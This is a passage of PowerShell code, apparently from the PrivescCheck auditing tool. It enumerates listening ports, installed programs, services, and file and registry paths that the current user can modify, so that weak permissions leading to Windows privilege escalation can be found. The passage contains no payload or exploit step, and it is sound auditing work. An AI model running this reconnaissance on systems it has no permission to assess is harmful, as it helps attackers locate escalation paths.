                Write-Verbose ([ComponentModel.Win32Exception] $LastError)
            }
        } else {
            Write-Verbose "Can't open token for process with PID $ProcessId"
        }

        # Cleanup - Close process handle 
        $Success = [PrivescCheck.Win32]::CloseHandle($ProcessHandle)
        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        if ($Success) {
            Write-Verbose "Process handle closed"
        } else {
            Write-Verbose ([ComponentModel.Win32Exception] $LastError)
        }
    } else {
        Write-Verbose "Can't open process with PID $ProcessId"
    }
}

function Get-NetworkEndpoints {
    <#
    .SYNOPSIS

    Helper - Gets a list of listening ports (TCP/UDP)

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    It uses the 'GetExtendedTcpTable' and 'GetExtendedUdpTable' functions of the Windows API to 
    list the TCP/UDP endpoints on the local machine. It handles both IPv4 and IPv6. For each 
    entry in the table, a custom PS object is returned, indicating the IP version (IPv4/IPv6),
    the protocol (TCP/UDP), the local address (e.g.: "0.0.0.0:445"), the state, the PID of the 
    associated process and the name of the process. The name of the process is retrieved through
    a call to "Get-Process -PID <PID>".
    
    .EXAMPLE

    PS C:\> Get-NetworkEndpoints | ft
    
    IP   Proto LocalAddress LocalPort Endpoint         State       PID Name
    --   ----- ------------ --------- --------         -----       --- ----
    IPv4 TCP   0.0.0.0            135 0.0.0.0:135      LISTENING  1216 svchost
    IPv4 TCP   0.0.0.0            445 0.0.0.0:445      LISTENING     4 System
    IPv4 TCP   0.0.0.0           5040 0.0.0.0:5040     LISTENING  8580 svchost
    IPv4 TCP   0.0.0.0          49664 0.0.0.0:49664    LISTENING   984 lsass
    IPv4 TCP   0.0.0.0          49665 0.0.0.0:49665    LISTENING   892 wininit
    IPv4 TCP   0.0.0.0          49666 0.0.0.0:49666    LISTENING  1852 svchost
    IPv4 TCP   0.0.0.0          49667 0.0.0.0:49667    LISTENING  1860 svchost
    IPv4 TCP   0.0.0.0          49668 0.0.0.0:49668    LISTENING  2972 svchost
    IPv4 TCP   0.0.0.0          49669 0.0.0.0:49669    LISTENING  4480 spoolsv
    IPv4 TCP   0.0.0.0          49670 0.0.0.0:49670    LISTENING   964 services
    
    .EXAMPLE

    PS C:\> Get-NetworkEndpoints -UDP -IPv6 | ft

    IP   Proto LocalAddress LocalPort Endpoint    State  PID Name       
    --   ----- ------------ --------- --------    -----  --- ----
    IPv6 UDP   ::                 500 [::]:500    N/A   5000 svchost
    IPv6 UDP   ::                3702 [::]:3702   N/A   4128 dasHost
    IPv6 UDP   ::                3702 [::]:3702   N/A   4128 dasHost
    IPv6 UDP   ::                4500 [::]:4500   N/A   5000 svchost
    IPv6 UDP   ::               62212 [::]:62212  N/A   4128 dasHost
    IPv6 UDP   ::1               1900 [::1]:1900  N/A   5860 svchost
    IPv6 UDP   ::1              63168 [::1]:63168 N/A   5860 svchost 
    #>

    [CmdletBinding()] param(
        [switch]
        $IPv6 = $False, # IPv4 by default 
        [switch]
        $UDP = $False # TCP by default 
    )

    $AF_INET6 = 23
    $AF_INET = 2
    
    if ($IPv6) { 
        $IpVersion = $AF_INET6
    } else {
        $IpVersion = $AF_INET
    }

    if ($UDP) {
        $UDP_TABLE_OWNER_PID = 1
        [int]$BufSize = 0
        $Result = [PrivescCheck.Win32]::GetExtendedUdpTable([IntPtr]::Zero, [ref]$BufSize, $True, $IpVersion, $UDP_TABLE_OWNER_PID, 0)
        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
    } else {
        $TCP_TABLE_OWNER_PID_LISTENER = 3
        [int]$BufSize = 0
        $Result = [PrivescCheck.Win32]::GetExtendedTcpTable([IntPtr]::Zero, [ref]$BufSize, $True, $IpVersion, $TCP_TABLE_OWNER_PID_LISTENER, 0)
        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
    }

    if ($Result -eq 122) {

        Write-Verbose "GetExtendedProtoTable() OK - Size: $BufSize"

        [IntPtr]$TablePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BufSize)

        if ($UDP) {
            $Result = [PrivescCheck.Win32]::GetExtendedUdpTable($TablePtr, [ref]$BufSize, $True, $IpVersion, $UDP_TABLE_OWNER_PID, 0)
            $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        } else {
            $Result = [PrivescCheck.Win32]::GetExtendedTcpTable($TablePtr, [ref]$BufSize, $True, $IpVersion, $TCP_TABLE_OWNER_PID_LISTENER, 0)
            $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        }

        if ($Result -eq 0) {

            if ($UDP) {
                if ($IpVersion -eq $AF_INET) { 
                    $Table = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TablePtr, [type] [PrivescCheck.Win32+MIB_UDPTABLE_OWNER_PID])
                } elseif ($IpVersion -eq $AF_INET6) { 
                    $Table = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TablePtr, [type] [PrivescCheck.Win32+MIB_UDP6TABLE_OWNER_PID])
                }
            } else {
                if ($IpVersion -eq $AF_INET) { 
                    $Table = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TablePtr, [type] [PrivescCheck.Win32+MIB_TCPTABLE_OWNER_PID])
                } elseif ($IpVersion -eq $AF_INET6) { 
                    $Table = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TablePtr, [type] [PrivescCheck.Win32+MIB_TCP6TABLE_OWNER_PID])
                }
            }
            
            $NumEntries = $Table.dwNumEntries

            Write-Verbose "GetExtendedProtoTable() OK - NumEntries: $NumEntries"

            $Offset = [IntPtr] ($TablePtr.ToInt64() + 4)

            For ($i = 0; $i -lt $NumEntries; $i++) {

                if ($UDP) {
                    if ($IpVersion -eq $AF_INET) {
                        $TableEntry = [System.Runtime.InteropServices.Marshal]::PtrToStructure($Offset, [type] [PrivescCheck.Win32+MIB_UDPROW_OWNER_PID])
                        $LocalAddr = (New-Object -TypeName System.Net.IPAddress($TableEntry.localAddr)).IPAddressToString
                    } elseif ($IpVersion -eq $AF_INET6) {
                        $TableEntry = [System.Runtime.InteropServices.Marshal]::PtrToStructure($Offset, [type] [PrivescCheck.Win32+MIB_UDP6ROW_OWNER_PID])
                        $LocalAddr = New-Object -TypeName System.Net.IPAddress($TableEntry.localAddr, $TableEntry.localScopeId)
                    }
                } else {
                    if ($IpVersion -eq $AF_INET) {
                        $TableEntry = [System.Runtime.InteropServices.Marshal]::PtrToStructure($Offset, [type] [PrivescCheck.Win32+MIB_TCPROW_OWNER_PID])
                        $LocalAddr = (New-Object -TypeName System.Net.IPAddress($TableEntry.localAddr)).IPAddressToString
                    } elseif ($IpVersion -eq $AF_INET6) {
                        $TableEntry = [System.Runtime.InteropServices.Marshal]::PtrToStructure($Offset, [type] [PrivescCheck.Win32+MIB_TCP6ROW_OWNER_PID])
                        $LocalAddr = New-Object -TypeName System.Net.IPAddress($TableEntry.localAddr, $TableEntry.localScopeId)
                    }
                }

                $LocalPort = $TableEntry.localPort[0] * 0x100 + $TableEntry.localPort[1]
                $ProcessId = $TableEntry.owningPid

                if ($IpVersion -eq $AF_INET) {
                    $LocalAddress = "$($LocalAddr):$($LocalPort)"
                } elseif ($IpVersion -eq $AF_INET6) {
                    $LocalAddress = "[$($LocalAddr)]:$($LocalPort)"
                }

                $ListenerObject = New-Object -TypeName PSObject 
                $ListenerObject | Add-Member -MemberType "NoteProperty" -Name "IP" -Value $(if ($IpVersion -eq $AF_INET) { "IPv4" } else { "IPv6" } )
                $ListenerObject | Add-Member -MemberType "NoteProperty" -Name "Proto" -Value $(if ($UDP) { "UDP" } else { "TCP" } )
                $ListenerObject | Add-Member -MemberType "NoteProperty" -Name "LocalAddress" -Value $LocalAddr
                $ListenerObject | Add-Member -MemberType "NoteProperty" -Name "LocalPort" -Value $LocalPort
                $ListenerObject | Add-Member -MemberType "NoteProperty" -Name "Endpoint" -Value $LocalAddress
                $ListenerObject | Add-Member -MemberType "NoteProperty" -Name "State" -Value $(if ($UDP) { "N/A" } else { "LISTENING" } )
                $ListenerObject | Add-Member -MemberType "NoteProperty" -Name "PID" -Value $ProcessId
                $ListenerObject | Add-Member -MemberType "NoteProperty" -Name "Name" -Value (Get-Process -PID $ProcessId).ProcessName
                $ListenerObject

                $Offset = [IntPtr] ($Offset.ToInt64() + [System.Runtime.InteropServices.Marshal]::SizeOf($TableEntry))
            }

        } else {
            Write-Verbose ([ComponentModel.Win32Exception] $LastError)
        }

        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TablePtr)

    } else {
        Write-Verbose ([ComponentModel.Win32Exception] $LastError)
    }
}

function Get-InstalledPrograms {
    <#
    .SYNOPSIS

    Helper - Enumerates the installed applications 

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    This looks for applications installed in the common "Program Files" and "Program Files (x86)" 
    folders. It also enumerates installed applications thanks to the registry by looking for all
    the subkeys in "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall".

    .PARAMETER Filtered

    If True, only non-default applications are returned. Otherwise, all the applications are 
    returned. The filter is base on a list of known applications which are known to be installed
    by default (e.g.: "Windows Defender").
    
    .EXAMPLE

    PS C:\> Get-InstalledPrograms -Filtered

    Mode                LastWriteTime     Length Name
    ----                -------------     ------ ----
    d----        29/11/2019     10:51            Npcap
    d----        29/11/2019     10:51            Wireshark
    
    #>
    
    [CmdletBinding()] param(
        [switch]
        $Filtered = $False
    )

    $InstalledProgramsResult = New-Object System.Collections.ArrayList

    $InstalledPrograms = New-Object System.Collections.ArrayList

    $PathProgram32 = Join-Path -Path $env:SystemDrive -ChildPath "Program Files (x86)"
    $PathProgram64 = Join-Path -Path $env:SystemDrive -ChildPath "Program Files" 

    $Items = Get-ChildItem -Path $PathProgram32,$PathProgram64 -ErrorAction SilentlyContinue
    if ($Items) {
        [void]$InstalledPrograms.AddRange($Items)
    }
    
    $RegInstalledPrograms = Get-ChildItem -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" 
    $RegInstalledPrograms6432 = Get-ChildItem -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" -ErrorAction SilentlyContinue
    if ($RegInstalledPrograms6432) { $RegInstalledPrograms += $RegInstalledPrograms6432 }
    ForEach ($InstalledProgram in $RegInstalledPrograms) {
        $InstallLocation = [System.Environment]::ExpandEnvironmentVariables($InstalledProgram.GetValue("InstallLocation"))
        if ($InstallLocation) {
            if (Test-Path -Path $InstallLocation -ErrorAction SilentlyContinue) {
                if ($InstallLocation[$InstallLocation.Length - 1] -eq "\") {
                    $InstallLocation = $InstallLocation.SubString(0, $InstallLocation.Length - 1)
                }
                $FileObject = Get-Item -Path $InstallLocation -ErrorAction SilentlyContinue -ErrorVariable GetItemError 
                if ($GetItemError) {
                    continue 
                }
                if ($FileObject -is [System.IO.DirectoryInfo]) {
                    continue
                }
                [void]$InstalledPrograms.Add([object]$FileObject)
            }
        }
    }

    $PathListResult = New-Object System.Collections.ArrayList
    ForEach ($InstalledProgram in $InstalledPrograms) {
        if (-not ($PathListResult -contains $InstalledProgram.FullName)) {
            [void]$InstalledProgramsResult.Add($InstalledProgram)
            [void]$PathListResult.Add($InstalledProgram.FullName)
        }
    }

    if ($Filtered) {
        $InstalledProgramsResultFiltered = New-Object -TypeName System.Collections.ArrayList
        ForEach ($InstalledProgram in $InstalledProgramsResult) {
            if (-Not ($global:IgnoredPrograms -contains $InstalledProgram.Name)) {
                [void]$InstalledProgramsResultFiltered.Add($InstalledProgram)
            }
        }
        $InstalledProgramsResultFiltered
    } else {
        $InstalledProgramsResult
    }
}

function Get-ServiceFromRegistry {

    [CmdletBinding()] param(
        [string]$Name
    )

    $ServicesRegPath = "HKLM\SYSTEM\CurrentControlSet\Services" 
    $ServiceRegPath = Join-Path -Path $ServicesRegPath -ChildPath $Name

    $ServiceProperties = Get-ItemProperty -Path "Registry::$ServiceRegPath" -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError
    if (-not $GetItemPropertyError) {

        $DisplayName = [System.Environment]::ExpandEnvironmentVariables($ServiceProperties.DisplayName)

        $ServiceItem = New-Object -TypeName PSObject 
        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $ServiceProperties.PSChildName
        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "DisplayName" -Value $DisplayName
        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "User" -Value $ServiceProperties.ObjectName 
        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "ImagePath" -Value $ServiceProperties.ImagePath 
        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "StartMode" -Value $(Convert-ServiceStartModeToString -StartMode $ServiceProperties.Start)
        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Type" -Value $(Convert-ServiceTypeToString -ServiceType $Properties.Type)
        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "RegistryKey" -Value $ServiceProperties.Name
        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "RegistryPath" -Value $ServiceProperties.PSPath
        $ServiceItem
    }
}

function Get-ServiceList {
    <#
    .SYNOPSIS

    Helper - Enumerates services (based on the registry)

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    This uses the registry to enumerate the services by looking for the subkeys of 
    "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services". This allows any user to get information
    about all the services. So, even if non-privileged users can't access the details of a service
    through the Service Control Manager, they can do so simply by accessing the registry.
    
    .PARAMETER FilterLevel

    This parameter can be used to filter out the result returned by the function based on the 
    following criteria:
        FilterLevel = 0 - No filtering 
        FilterLevel = 1 - Exclude 'Services with empty ImagePath'
        FilterLevel = 2 - Exclude 'Services with empty ImagePath' + 'Drivers' 
        FilterLevel = 3 - Exclude 'Services with empty ImagePath' + 'Drivers' + 'Known services' 
    
    .EXAMPLE

    PS C:\> Get-ServiceList -FilterLevel 3

    Name         : VMTools
    DisplayName  : VMware Tools
    User         : LocalSystem
    ImagePath    : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
    StartMode    : Automatic
    Type         : Win32OwnProcess
    RegistryKey  : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VMTools
    RegistryPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VMTools
    
    .NOTES

    A service "Type" can be one of the following:
        KernelDriver = 1
        FileSystemDriver = 2
        Adapter = 4
        RecognizerDriver = 8
        Win32OwnProcess = 16
        Win32ShareProcess = 32 
        InteractiveProcess = 256

    #>
    
    [CmdletBinding()] param(
        [Parameter(Mandatory=$true)]
        [ValidateSet(0,1,2,3)]
        [int]
        $FilterLevel
    )

    $ServicesRegPath = "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services" 
    $RegAllServices = Get-ChildItem -Path $ServicesRegPath

    ForEach ($RegService in $RegAllServices) {

        $Properties = Get-ItemProperty -Path $RegService.PSPath -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError
        if ($GetItemPropertyError) {
            # If an error occurred, skip the current item 
            continue 
        } 

        $DisplayName = [System.Environment]::ExpandEnvironmentVariables($Properties.DisplayName)

        $ServiceItem = New-Object -TypeName PSObject 
        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $Properties.PSChildName
        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "DisplayName" -Value $DisplayName
        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "User" -Value $Properties.ObjectName 
        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "ImagePath" -Value $Properties.ImagePath 
        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "StartMode" -Value $(Convert-ServiceStartModeToString -StartMode $Properties.Start)
        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Type" -Value $(Convert-ServiceTypeToString -ServiceType $Properties.Type)
        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "RegistryKey" -Value $RegService.Name
        $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "RegistryPath" -Value $RegService.PSPath 

        # FilterLevel = 0 - Add the service to the list and go to the next one 
        if ($FilterLevel -eq 0) {
            $ServiceItem
            continue 
        }

        if ($Properties.ImagePath -and (-not ($Properties.ImagePath.trim() -eq ''))) {
            # FilterLevel = 1 - Add the service to the list of its ImagePath is not empty
            if ($FilterLevel -le 1) {
                $ServiceItem
                continue 
            }

            if ($Properties.Type -gt 8) {
                # FilterLevel = 2 - Add the service to the list if it's not a driver 
                if ($FilterLevel -le 2) {
                    $ServiceItem
                    continue
                }

                if (-not (Test-IsKnownService -Service $ServiceItem)) {
                    # FilterLevel = 3 - Add the service if it's not a built-in Windows service 
                    if ($FilterLevel -le 3) {
                        $ServiceItem
                        continue
                    }
                }
            }
        } 
    }
}

function Get-ModifiablePath {
    <#
    .SYNOPSIS

    Parses a passed string containing multiple possible file/folder paths and returns
    the file paths where the current user has modification rights.

    Author: @harmj0y
    License: BSD 3-Clause

    .DESCRIPTION

    Takes a complex path specification of an initial file/folder path with possible
    configuration files, 'tokenizes' the string in a number of possible ways, and
    enumerates the ACLs for each path that currently exists on the system. Any path that
    the current user has modification rights on is returned in a custom object that contains
    the modifiable path, associated permission set, and the IdentityReference with the specified
    rights. The SID of the current user and any group he/she are a part of are used as the
    comparison set against the parsed path DACLs.

    @itm4n: I made some small changes to the original code in order to prevent false positives as
    much as possible. 

    .PARAMETER Path

    The string path to parse for modifiable files. Required

    .PARAMETER LiteralPaths

    Switch. Treat all paths as literal (i.e. don't do 'tokenization').

    .EXAMPLE

    PS C:\> '"C:\Temp\blah.exe" -f "C:\Temp\config.ini"' | Get-ModifiablePath

    Path                       Permissions                IdentityReference
    ----                       -----------                -----------------
    C:\Temp\blah.exe           {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...
    C:\Temp\config.ini         {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...

    .EXAMPLE

    PS C:\> Get-ChildItem C:\Vuln\ -Recurse | Get-ModifiablePath

    Path                       Permissions                IdentityReference
    ----                       -----------                -----------------
    C:\Vuln\blah.bat           {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...
    C:\Vuln\config.ini         {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...
    ...
    #>
    
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias('FullName')]
        [String[]]
        $Path,

        [Switch]
        $LiteralPaths
    )

    BEGIN {
        # # false positives ?
        # $Excludes = @("MsMpEng.exe", "NisSrv.exe")

        # from http://stackoverflow.com/questions/28029872/retrieving-security-descriptor-and-getting-number-for-filesystemrights
        $AccessMask = @{
            [uint32]'0x80000000' = 'GenericRead'
            [uint32]'0x40000000' = 'GenericWrite'
            [uint32]'0x20000000' = 'GenericExecute'
            [uint32]'0x10000000' = 'GenericAll'
            [uint32]'0x02000000' = 'MaximumAllowed'
            [uint32]'0x01000000' = 'AccessSystemSecurity'
            [uint32]'0x00100000' = 'Synchronize'
            [uint32]'0x00080000' = 'WriteOwner'
            [uint32]'0x00040000' = 'WriteDAC'
            [uint32]'0x00020000' = 'ReadControl'
            [uint32]'0x00010000' = 'Delete'
            [uint32]'0x00000100' = 'WriteAttributes'
            [uint32]'0x00000080' = 'ReadAttributes'
            [uint32]'0x00000040' = 'DeleteChild'
            [uint32]'0x00000020' = 'Execute/Traverse'
            [uint32]'0x00000010' = 'WriteExtendedAttributes'
            [uint32]'0x00000008' = 'ReadExtendedAttributes'
            [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
            [uint32]'0x00000002' = 'WriteData/AddFile'
            [uint32]'0x00000001' = 'ReadData/ListDirectory'
        }

        $UserIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $CurrentUserSids = $UserIdentity.Groups | Select-Object -ExpandProperty Value
        $CurrentUserSids += $UserIdentity.User.Value

        $TranslatedIdentityReferences = @{}
    }

    PROCESS {

        ForEach($TargetPath in $Path) {

            $CandidatePaths = @()

            # possible separator character combinations
            $SeparationCharacterSets = @('"', "'", ' ', "`"'", '" ', "' ", "`"' ")

            if($PSBoundParameters['LiteralPaths']) {

                $TempPath = $([System.Environment]::ExpandEnvironmentVariables($TargetPath))

                if(Test-Path -Path $TempPath -ErrorAction SilentlyContinue) {
                    $CandidatePaths += Resolve-Path -Path $TempPath | Select-Object -ExpandProperty Path
                }
                else {
                    # if the path doesn't exist, check if the parent folder allows for modification
                    try {
                        $ParentPath = Split-Path $TempPath -Parent
                        if($ParentPath -and (Test-Path -Path $ParentPath -ErrorAction SilentlyContinue)) {
                            $CandidatePaths += Resolve-Path -Path $ParentPath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path
                        }
                    }
                    catch {
                        # because Split-Path doesn't handle -ErrorAction SilentlyContinue nicely
                    }
                }
            }
            else {
                ForEach($SeparationCharacterSet in $SeparationCharacterSets) {
                    $TargetPath.Split($SeparationCharacterSet) | Where-Object {$_ -and ($_.trim() -ne '')} | ForEach-Object {

                        if(($SeparationCharacterSet -notmatch ' ')) {

                            $TempPath = $([System.Environment]::ExpandEnvironmentVariables($_)).Trim()

                            # if the path is actually an option like '/svc', skip it 
                            # it will prevent a lot of false positives but it might also skip vulnerable paths in some particular cases 
                            # though, it's more common to see options like '/svc' than file paths like '/ProgramData/something' in Windows 
                            if (-not ($TempPath -Like "/*")) { 

                                if($TempPath -and ($TempPath -ne '')) {
                                    if(Test-Path -Path $TempPath -ErrorAction SilentlyContinue) {
                                        # if the path exists, resolve it and add it to the candidate list
                                        $CandidatePaths += Resolve-Path -Path $TempPath | Select-Object -ExpandProperty Path
                                    }
                                    else {
                                        # if the path doesn't exist, check if the parent folder allows for modification
                                        try {
                                            $ParentPath = (Split-Path -Path $TempPath -Parent -ErrorAction SilentlyContinue).Trim()
                                            if($ParentPath -and ($ParentPath -ne '') -and (Test-Path -Path $ParentPath -ErrorAction SilentlyContinue)) {
                                                $CandidatePaths += Resolve-Path -Path $ParentPath | Select-Object -ExpandProperty Path
                                            }
                                        }
                                        catch {
                                            # trap because Split-Path doesn't handle -ErrorAction SilentlyContinue nicely
                                        }
                                    }
                                }
                            }
                        }
                        else {
                            # if the separator contains a space
                            $CandidatePaths += Resolve-Path -Path $([System.Environment]::ExpandEnvironmentVariables($_)) -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path | ForEach-Object {$_.Trim()} | Where-Object {($_ -ne '') -and (Test-Path -Path $_)}
                        }
                    }
                }
            }

            $CandidatePaths | Sort-Object -Unique | ForEach-Object {

                $CandidatePath = $_

                try {
                
                    Get-Acl -Path $CandidatePath | Select-Object -ExpandProperty Access | Where-Object {($_.AccessControlType -match 'Allow')} | ForEach-Object {

                        $FileSystemRights = $_.FileSystemRights.value__

                        $Permissions = $AccessMask.Keys | Where-Object { $FileSystemRights -band $_ } | ForEach-Object { $accessMask[$_] }

                        # the set of permission types that allow for modification
                        $Comparison = Compare-Object -ReferenceObject $Permissions -DifferenceObject @('GenericWrite', 'GenericAll', 'MaximumAllowed', 'WriteOwner', 'WriteDAC', 'WriteData/AddFile', 'AppendData/AddSubdirectory') -IncludeEqual -ExcludeDifferent

                        if($Comparison) {
                            if ($_.IdentityReference -notmatch '^S-1-5.*' -and $_.IdentityReference -notmatch '^S-1-15-.*') {
                                if(-not ($TranslatedIdentityReferences[$_.IdentityReference])) {
                                    # translate the IdentityReference if it's a username and not a SID
                                    $IdentityUser = New-Object System.Security.Principal.NTAccount($_.IdentityReference)
                                    $TranslatedIdentityReferences[$_.IdentityReference] = $IdentityUser.Translate([System.Security.Principal.SecurityIdentifier]) | Select-Object -ExpandProperty Value
                                }
                                $IdentitySID = $TranslatedIdentityReferences[$_.IdentityReference]
                            }
                            else {
                                $IdentitySID = $_.IdentityReference
                            }

                            if($CurrentUserSids -contains $IdentitySID) {
                                New-Object -TypeName PSObject -Property @{
                                    ModifiablePath = $CandidatePath
                                    IdentityReference = $_.IdentityReference
                                    Permissions = $Permissions
                                }
                            }
                        }
                    }
                } catch {
                    # trap because Get-Acl doesn't handle -ErrorAction SilentlyContinue nicely
                }
            }
        }
    }
}

function Get-ModifiableRegistryPath {
    <#
    .SYNOPSIS

    Helper - Checks the permissions of a given registry key and returns the ones that the current 
    user can modify. It's based on the same technique as the one used by @harmj0y in 
    "Get-ModifiablePath".

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    Any registry path that the current user has modification rights on is returned in a custom 
    object that contains the modifiable path, associated permission set, and the IdentityReference
    with the specified rights. The SID of the current user and any group he/she are a part of are 
    used as the comparison set against the parsed path DACLs.
    
    .PARAMETER Path

    A registry key path. Required
    
    .EXAMPLE

    Get-ModifiableRegistryPath -Path "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VulnService"

    Name              : VulnService
    ImagePath         : C:\APPS\MyApp\service.exe
    User              : NT AUTHORITY\NetworkService
    ModifiablePath    : {Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VulnService}
    IdentityReference : NT AUTHORITY\INTERACTIVE
    Permissions       : {ReadControl, AppendData/AddSubdirectory, ReadExtendedAttributes, ReadData/ListDirectory}
    Status            : Running
    UserCanStart      : True
    UserCanRestart    : False
    
    #>
    
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [String[]]
        $Path
    )

    BEGIN {
        # from http://stackoverflow.com/questions/28029872/retrieving-security-descriptor-and-getting-number-for-filesystemrights
        $AccessMask = @{
            [uint32]'0x80000000' = 'GenericRead'
            [uint32]'0x40000000' = 'GenericWrite'
            [uint32]'0x20000000' = 'GenericExecute'
            [uint32]'0x10000000' = 'GenericAll'
            [uint32]'0x02000000' = 'MaximumAllowed'
            [uint32]'0x01000000' = 'AccessSystemSecurity'
            [uint32]'0x00100000' = 'Synchronize'
            [uint32]'0x00080000' = 'WriteOwner'
            [uint32]'0x00040000' = 'WriteDAC'
            [uint32]'0x00020000' = 'ReadControl'
            [uint32]'0x00010000' = 'Delete'
            [uint32]'0x00000100' = 'WriteAttributes'
            [uint32]'0x00000080' = 'ReadAttributes'
            [uint32]'0x00000040' = 'DeleteChild'
            [uint32]'0x00000020' = 'Execute/Traverse'
            [uint32]'0x00000010' = 'WriteExtendedAttributes'
            [uint32]'0x00000008' = 'ReadExtendedAttributes'
            [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
            [uint32]'0x00000002' = 'WriteData/AddFile'
            [uint32]'0x00000001' = 'ReadData/ListDirectory'
        }

        $UserIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $CurrentUserSids = $UserIdentity.Groups | Select-Object -ExpandProperty Value
        $CurrentUserSids += $UserIdentity.User.Value

        $TranslatedIdentityReferences = @{}
    }

    PROCESS {
        $KeyAcl = Get-Acl -Path $Path -ErrorAction SilentlyContinue -ErrorVariable GetAclError
        if (-not $GetAclError) {
            $KeyAcl | Select-Object -ExpandProperty Access | Where-Object {($_.AccessControlType -match 'Allow')} | ForEach-Object {

                $RegistryRights = $_.RegistryRights.value__

                $Permissions = $AccessMask.Keys | Where-Object { $RegistryRights -band $_ } | ForEach-Object { $accessMask[$_] }

                # the set of permission types that allow for modification
                $Comparison = Compare-Object -ReferenceObject $Permissions -DifferenceObject @('GenericWrite', 'GenericAll', 'MaximumAllowed', 'WriteOwner', 'WriteDAC', 'WriteData/AddFile', 'AppendData/AddSubdirectory') -IncludeEqual -ExcludeDifferent

                if($Comparison) {
                    if ($_.IdentityReference -notmatch '^S-1-5.*') {
                        if(-not ($TranslatedIdentityReferences[$_.IdentityReference])) {
                            # translate the IdentityReference if it's a username and not a SID
                            $IdentityUser = New-Object System.Security.Principal.NTAccount($_.IdentityReference)
                            $TranslatedIdentityReferences[$_.IdentityReference] = $IdentityUser.Translate([System.Security.Principal.SecurityIdentifier]) | Select-Object -ExpandProperty Value
                        }
                        $IdentitySID = $TranslatedIdentityReferences[$_.IdentityReference]
                    }
                    else {
                        $IdentitySID = $_.IdentityReference
                    }

                    if($CurrentUserSids -contains $IdentitySID) {
                        New-Object -TypeName PSObject -Property @{
                            ModifiablePath = $Path
                            IdentityReference = $_.IdentityReference
                            Permissions = $Permissions
                        }
                    }
                }
            }
        }
    } 
}

function Add-ServiceDacl {
    <#
    .SYNOPSIS

    Adds a Dacl field to a service object returned by Get-Service.

    Author: Matthew Graeber (@mattifestation)
    License: BSD 3-Clause

    .DESCRIPTION

    Takes one or more ServiceProcess.ServiceController objects on the pipeline and adds a
    Dacl field to each object. It does this by opening a handle with ReadControl for the
    service with using the GetServiceHandle Win32 API call and then uses
    QueryServiceObjectSecurity to retrieve a copy of the security descriptor for the service.

    @itm4n: I had to make some small changes to the original code because i don't import the
    Win32 API functions the same way it was done in PowerUp.

    .PARAMETER Name

    An array of one or more service names to add a service Dacl for. Passable on the pipeline.

    .EXAMPLE

    PS C:\> Get-Service | Add-ServiceDacl

    Add Dacls for every service the current user can read.

    .EXAMPLE

    PS C:\> Get-Service -Name VMTools | Add-ServiceDacl

    Add the Dacl to the VMTools service object.

    .OUTPUTS

    ServiceProcess.ServiceController

    .LINK

    https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/
    #>

    [OutputType('ServiceProcess.ServiceController')]
    param (
        [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias('ServiceName')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $Name
    )

    BEGIN {
